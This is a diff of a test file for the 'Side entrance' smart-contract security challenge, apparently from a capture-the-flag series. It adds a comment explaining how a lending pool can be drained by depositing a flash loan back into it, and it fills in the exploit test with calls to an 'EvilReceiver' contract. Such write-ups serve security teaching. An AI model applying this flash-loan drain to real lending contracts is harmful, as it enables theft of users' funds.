@@ -18,13 +18,26 @@ describe('[Challenge] Side entrance', function () {
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
 
+        console.log("attacker init balance:", ethers.utils.formatUnits(this.attackerInitialEthBalance, 18));
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.equal(ETHER_IN_POOL);
     });
 
+    /**
+     * Goal: Steal all ether from lending pool
+     * Bug: Pool does not check the deposit amount of borrower before and after flash loan. 
+     * Solution: borrow flash loan and deposit back to the pool, then withdraw all of them.
+     */
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const factory = await ethers.getContractFactory('EvilReceiver', attacker);
+        const receiver = await factory.deploy(this.pool.address);
+        
+        await receiver.connect(attacker).executeFlashLoan();
+        await receiver.connect(attacker).withdraw();
+    
+        console.log("attacker final balance:", ethers.utils.formatUnits(await ethers.provider.getBalance(attacker.address), 18));
+
     });
 
     after(async function () {
